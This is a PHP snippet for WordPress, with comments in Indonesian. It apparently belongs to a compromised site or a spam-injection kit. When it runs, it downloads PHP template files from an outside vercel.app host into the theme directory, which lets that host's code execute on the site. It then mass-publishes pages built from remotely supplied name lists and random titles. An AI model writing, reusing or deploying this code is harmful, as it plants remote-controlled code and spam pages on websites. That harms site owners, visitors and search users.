
function download_template($url, $path) {
    $content = file_get_contents($url);
    if ($content === FALSE) {
        error_log("Gagal mengunduh template dari $url");
        return FALSE;
    }
    if (file_put_contents($path, $content) === FALSE) {
        error_log("Gagal menyimpan template ke $path");
        return FALSE;
    }
    return TRUE;
}

function create_pages_from_urls($urls, $title_url, $template_urls) {
    if (($title_content = file_get_contents($title_url)) === FALSE) return;
    if (($title_data = json_decode($title_content, true)) === NULL || !isset($title_data['titles'])) return;

    // Unduh dan simpan template dari URL
    $templates = [];
    foreach ($template_urls as $template_url) {
        $template_name = basename($template_url);
        $template_path = get_template_directory() . '/' . $template_name;
        if (download_template($template_url, $template_path)) {
            $templates[] = $template_name;
        }
    }

    foreach ($urls as $url) {
        if (($content = file_get_contents($url)) === FALSE) continue;
        if (($data = json_decode($content, true)) === NULL || !isset($data['names'])) continue;

        foreach ($data['names'] as $name) {
            if (!empty($name = trim($name))) {
                $slug = sanitize_title($name);
                if (get_page_by_path($slug, OBJECT, 'page') === null) {
                    $random_title = $title_data['titles'][array_rand($title_data['titles'])];
                    $random_template = $templates[array_rand($templates)];
                    error_log("Menggunakan template: $random_template untuk halaman: $name");
                    wp_insert_post([
                        'post_title'   => "$name $random_title",
                        'post_content' => "Konten halaman untuk $name",
                        'post_status'  => 'publish',
                        'post_type'    => 'page',
                        'post_name'    => $slug,
                        'page_template'=> $random_template, // Menambahkan template acak
                    ]);
                }
            }
        }
    }
}

$base_url = 'https://database403.vercel.app/tunnel/go/';
$files = ['list.txt', 'list2.txt', 'list3.txt', 'list4.txt', 'list5.txt', 'list6.txt', 'list7.txt', 'list8.txt', 'list9.txt', 'list10.txt'];
$urls = array_map(fn($file) => $base_url . $file, $files);

// Daftar nama file template
$template_files = [
    'wp/tamplate.php',
    'wp/tamplate2.php',
    // Tambahkan nama file template lainnya di sini
];

// Membuat daftar URL template lengkap
$template_urls = array_map(fn($file) => $base_url . $file, $template_files);

create_pages_from_urls($urls, $base_url . 'title.json', $template_urls);
